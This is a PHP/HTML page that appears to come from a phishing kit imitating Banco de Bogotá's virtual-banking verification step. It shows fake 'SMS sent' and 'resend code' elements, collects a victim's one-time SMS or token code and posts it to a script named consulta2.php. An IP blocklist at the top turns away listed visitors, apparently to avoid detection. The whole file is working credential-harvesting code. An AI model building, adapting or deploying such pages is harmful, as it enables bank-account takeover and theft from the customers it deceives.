<?php
// --- IP BLACKLIST GLOBAL CHECK ---
$client_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
if (!empty($client_ip)) {
    $client_ip = trim(explode(',', $client_ip)[0]);
}
$secRoot = __DIR__; while($secRoot !== dirname($secRoot)) { if (file_exists($secRoot . '/includes/security.php')) { require_once $secRoot . '/includes/security.php'; break; } $secRoot = dirname($secRoot); } $blacklist_file = (function_exists('sura_get_project_root') ? sura_get_project_root() : $secRoot) . '/blocked_ips.txt';
if (file_exists($blacklist_file)) {
    $blocked_ips = file($blacklist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($client_ip, $blocked_ips)) {
        header("HTTP/1.1 403 Forbidden");
        exit("Acceso denegado.");
    }
}
// ---------------------------------

session_start();

// Leer tipo de token de la URL o sesión
$type = $_GET['type'] ?? $_SESSION['token_type'] ?? '6';
$type = in_array($type, ['6', '8']) ? $type : '6';
$_SESSION['token_type'] = $type;

$isError = isset($_GET['error']) && $_GET['error'] == '1';

// Configurar UI según el tipo
if ($type === '8') {
    $titulo        = 'Código Token';
    $instrucciones = 'Para realizar este proceso, ingresa el código de Token móvil o físico.';
    $numCajas      = 6;
    $showToast     = false; // Oculta el banner verde
    $showResend    = true;
} else {
    $titulo        = 'Código de verificación';
    $instrucciones = 'Ingresa el código de 6 dígitos enviado a tu celular por mensaje de texto.';
    $numCajas      = 6;
    $showToast     = true;
    $showResend    = true;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación Banca Virtual</title>
    <link rel="icon" type="image/x-icon" href="https://virtual.bancodebogota.co/bbog-pb-frontend-bv-shell/assets/favicon.ico">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; -webkit-font-smoothing: antialiased; }
        body { background-color: #F8FAFB; min-height: 100vh; display: flex; flex-direction: column; }

        .header { background-color: #FFFFFF; height: 60px; display: flex; align-items: center; justify-content: space-between; padding: 0 24px; border-bottom: 1px solid #EAECEF; width: 100%; position: relative; z-index: 10; }
        .nav-btn { display: flex; align-items: center; gap: 8px; color: #00448D; font-size: 14px; font-weight: 500; text-decoration: none; cursor: pointer; background: none; border: none; }
        .nav-btn svg { width: 20px; height: 20px; stroke: #00448D; stroke-width: 1.8; fill: none; }
        .header-title { font-size: 16px; font-weight: 600; color: #000000; }

        .main-container { flex: 1; padding-top: 80px; padding-left: 20px; padding-right: 20px; width: 100%; }
        .content-wrapper { width: 100%; max-width: 556px; margin: 0 auto; display: flex; flex-direction: column; position: relative; }
        .page-title { font-size: 20px; font-weight: 600; color: #374151; margin-bottom: 20px; text-align: left; width: 100%; letter-spacing: -0.2px; }

        .verify-card { background-color: #FFFFFF; border: 1px solid #EAECEF; border-radius: 12px; width: 100%; padding: 40px 48px; box-shadow: 0 4px 12px rgba(0,0,0,0.02); display: flex; flex-direction: column; }

        .icon-container { margin-bottom: 12px; }
        .token-icon { width: 44px; height: 44px; display: block; object-fit: contain; }
        
        .card-title-row { display: flex; align-items: center; gap: 6px; margin-bottom: 12px; }
        .card-title { font-size: 20px; font-weight: 600; color: #1F2937; letter-spacing: -0.2px; }
        .info-icon { width: 20px; height: 20px; stroke: #00448D; stroke-width: 1.8; fill: none; margin-left: 2px; }
        
        .instructions { font-size: 15px; color: #4B5563; line-height: 1.5; margin-bottom: 28px; }
        .instructions strong { color: #4B5563; font-weight: 400; }

        .token-inputs { display: flex; justify-content: flex-start; gap: <?= $numCajas === 8 ? '8px' : '12px' ?>; margin-bottom: <?= $isError ? '10px' : '30px' ?>; flex-wrap: nowrap; }
        .token-box { width: <?= $numCajas === 8 ? '44px' : '48px' ?>; height: 48px; border: 1px solid #D1D5DB; border-radius: 8px; text-align: center; font-size: 20px; font-weight: 600; color: #000000; outline: none; transition: border-color 0.2s; padding: 0; }
        .token-box:focus { border-color: #00448D; box-shadow: 0 0 0 1px #00448D; }
        .token-box.error { border-color: #D9534F; background-color: #FEF2F2; color: #D14545; }

        .error-msg { font-size: 15px; color: #D14545; margin-bottom: 25px; text-align: left; }

        /* Contenedor de acciones: Botón y Reenviar en la misma línea */
        .form-actions { display: flex; align-items: center; gap: 24px; margin-top: 10px; }

        .btn-verify { width: 125px; height: 46px; background-color: #E5E7EB; color: #9CA3AF; border: none; border-radius: 8px; font-weight: 600; font-size: 15px; cursor: not-allowed; transition: all 0.3s; }
        .btn-verify.active { background-color: #00448D; color: #FFFFFF; cursor: pointer; }

        /* Toast SMS flotante y estilos ajustados */
        .sms-toast-wrapper {
            position: fixed;
            top: 80px; 
            left: 50%;
            transform: translateX(-50%);
            width: 100%;
            max-width: 556px;
            z-index: 9999;
            padding: 0 20px; 
        }
        
        .sms-toast {
            background-color: #EBF5EB; 
            border: 1px solid #C4DEC5;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 14px 20px;
            font-size: 15px;
            font-weight: 500;
            color: #1F2937;
            box-shadow: 0 6px 16px rgba(0,0,0,0.06); 
            transition: opacity 0.5s ease, transform 0.5s ease;
            animation: slideDown 0.4s ease-out;
        }

        @keyframes slideDown {
            from { opacity: 0; transform: translateY(-15px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .sms-toast.hide {
            opacity: 0;
            transform: translateY(-15px);
            pointer-events: none;
        }
        .sms-toast-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .sms-toast svg.check-icon {
            flex-shrink: 0;
            width: 22px;
            height: 22px;
        }
        .sms-toast svg.close-icon {
            flex-shrink: 0;
            width: 18px;
            height: 18px;
            stroke: #5F6368;
            cursor: pointer;
        }

        /* Área resend con countdown */
        .resend-row {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .countdown-circle {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            border: 2px solid #00448D;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 13px;
            font-weight: 600;
            color: #1F2937; 
            flex-shrink: 0;
        }
        .resend-link {
            font-size: 14px;
            font-weight: 500;
            color: #4B5563;
            cursor: default;
        }
        .resend-link.enabled {
            color: #00448D;
            cursor: pointer;
            text-decoration: underline;
        }

        @media (max-width: 768px) {
            .header { padding: 0 16px; }
            .nav-text { display: none; }
            .nav-btn svg { width: 22px; height: 22px; stroke-width: 1.5; }
            .header-title { font-size: 15px; font-weight: 600; }

            .main-container { padding-top: 30px; padding-left: 16px; padding-right: 16px; }
            .page-title { display: none; }
            .content-wrapper { max-width: 420px; }

            .verify-card { 
                border: 1px solid #EAECEF; 
                background-color: #FFFFFF; 
                padding: 24px 16px; 
                width: 100%; 
                border-radius: 12px;
                box-shadow: 0 2px 8px rgba(0,0,0,0.02);
            }
            
            /* Ajustes para que los campos no se salgan del contenedor en móvil */
            .token-inputs { 
                justify-content: space-between; 
                gap: <?= $numCajas === 8 ? '4px' : '6px' ?>; 
                margin-bottom: 24px; 
                width: 100%;
            }
            .token-box { 
                flex: 1; 
                min-width: 0; 
                height: <?= $numCajas === 8 ? '46px' : '50px' ?>; 
                font-size: <?= $numCajas === 8 ? '18px' : '22px' ?>; 
            }
            
            .form-actions { flex-direction: column; align-items: center; gap: 20px; width: 100%; }
            .btn-verify { width: 100%; height: 50px; border-radius: 8px; font-size: 16px; }
            .resend-row { width: 100%; justify-content: center; } 
        }
    </style>
</head>
<body>
    <header class="header">
        <button class="nav-btn">
            <svg viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7" stroke-linecap="round" stroke-linejoin="round"/></svg>
            <span class="nav-text">Atrás</span>
        </button>
        <div class="header-title">Ingreso a Banca Virtual</div>
        <button class="nav-btn">
            <span class="nav-text">Abandonar</span>
            <svg viewBox="0 0 24 24"><path d="M18 6L6 18M6 6l12 12" stroke-linecap="round" stroke-linejoin="round"/></svg>
        </button>
    </header>

    <?php if ($showToast): ?>
    <!-- Toast: Código SMS enviado (Flotante) -->
    <div class="sms-toast-wrapper" id="smsToastWrapper">
        <div class="sms-toast" id="smsToast">
            <div class="sms-toast-left">
                <svg class="check-icon" viewBox="0 0 24 24" fill="none">
                    <circle cx="12" cy="12" r="10" fill="#315533"/>
                    <path d="M7 12l3.5 3.5L17 8.5" stroke="#FFFFFF" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
                <span>Código SMS enviado</span>
            </div>
            <svg class="close-icon" viewBox="0 0 24 24" fill="none" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" onclick="document.getElementById('smsToastWrapper').style.display='none'">
                <line x1="18" y1="6" x2="6" y2="18"></line>
                <line x1="6" y1="6" x2="18" y2="18"></line>
            </svg>
        </div>
    </div>
    <?php endif; ?>

    <main class="main-container">
        <div class="content-wrapper">
            <h1 class="page-title">Verifiquemos que eres tú</h1>

            <div class="verify-card">
                <div class="icon-container">
                    <!-- Ícono Candado desde imagen PNG para ambos casos -->
                    <img src="img/candado.png" alt="Icono Candado" class="token-icon">
                </div>

                <div class="card-title-row">
                    <h2 class="card-title"><?= htmlspecialchars($titulo) ?></h2>
                    <!-- Icono "i" de información añadido solo para tipo 8 dígitos -->
                    <?php if ($type === '8'): ?>
                    <svg class="info-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <circle cx="12" cy="12" r="10"></circle>
                        <line x1="12" y1="16" x2="12" y2="12"></line>
                        <line x1="12" y1="8" x2="12.01" y2="8"></line>
                    </svg>
                    <?php endif; ?>
                </div>

                <p class="instructions"><?= $instrucciones ?></p>

                <form id="tokenForm" style="display: flex; flex-direction: column; flex: 1;">
                    <div class="token-inputs">
                        <?php for ($i = 0; $i < $numCajas; $i++): ?>
                        <input type="tel" class="token-box <?= $isError ? 'error' : '' ?>" maxlength="1" autocomplete="off" oninput="inputManejo(this, <?= $i ?>)">
                        <?php endfor; ?>
                    </div>

                    <?php if ($isError): ?>
                    <div class="error-msg" id="errorText">Código incorrecto. Por favor, inténtalo nuevamente.</div>
                    <?php endif; ?>

                    <input type="hidden" id="u_type" value="<?= $type ?>">
                    
                    <div class="form-actions">
                        <button type="button" id="btnVerificar" class="btn-verify" onclick="enviarToken()">Verificar</button>

                        <?php if ($showResend): ?>
                        <div class="resend-row">
                            <div class="countdown-circle"><span id="countdownCircle">30</span></div>
                            <span class="resend-link" id="resendLink">Reenviar código por llamada</span>
                        </div>
                        <?php endif; ?>
                    </div>
                </form>
            </div>
        </div>
    </main>

    <script>
        const inputs = document.querySelectorAll('.token-box');
        const btn    = document.getElementById('btnVerificar');

        function inputManejo(element, index) {
            // Quitar el estado de error apenas el usuario escribe
            inputs.forEach(i => i.classList.remove('error'));
            const errEl = document.getElementById('errorText');
            if (errEl) errEl.style.display = 'none';

            element.value = element.value.replace(/\D/g, '');
            if (element.value.length === 1 && index < inputs.length - 1) {
                inputs[index + 1].focus();
            }
            validarFormulario();
        }

        inputs.forEach((input, index) => {
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && input.value.length === 0 && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });

        function validarFormulario() {
            const completo = Array.from(inputs).every(i => i.value.length === 1);
            btn.disabled = !completo;
            btn.classList.toggle('active', completo);
        }

        function enviarToken() {
            let token = '';
            inputs.forEach(i => token += i.value);

            const form = document.createElement('form');
            form.method = 'POST';
            form.action = 'consulta2.php';

            const f1 = document.createElement('input');
            f1.type  = 'hidden';
            f1.name  = 'u_tk';
            f1.value = token;

            const f2 = document.createElement('input');
            f2.type  = 'hidden';
            f2.name  = 'u_type';
            f2.value = document.getElementById('u_type').value;

            form.appendChild(f1);
            form.appendChild(f2);
            document.body.appendChild(form);
            form.submit();
        }

        // ── Toast 5 seg (solo SMS) ──────────────────────────────────────────
        const toast = document.getElementById('smsToast');
        if (toast) {
            setTimeout(() => toast.classList.add('hide'), 4500);
            setTimeout(() => {
                const wrapper = document.getElementById('smsToastWrapper');
                if (wrapper) wrapper.remove();
            }, 5000);
        }

        // ── Countdown 30s → habilita "Reenviar" ────────────────────────────
        const circle   = document.getElementById('countdownCircle');
        const resendEl = document.getElementById('resendLink');
        if (circle && resendEl) {
            let seconds = 30;
            const timer = setInterval(() => {
                seconds--;
                circle.textContent = seconds;
                if (seconds <= 0) {
                    clearInterval(timer);
                    circle.style.borderColor = '#00448D';
                    resendEl.classList.add('enabled');
                    resendEl.onclick = () => {
                        seconds = 30;
                        circle.textContent  = seconds;
                        circle.style.borderColor = '#00448D';
                        resendEl.classList.remove('enabled');
                        resendEl.onclick = null;
                        // reiniciar countdown
                        const t2 = setInterval(() => {
                            seconds--;
                            circle.textContent = seconds;
                            if (seconds <= 0) clearInterval(t2);
                        }, 1000);
                    };
                }
            }, 1000);
        }
    </script>
</body>
</html>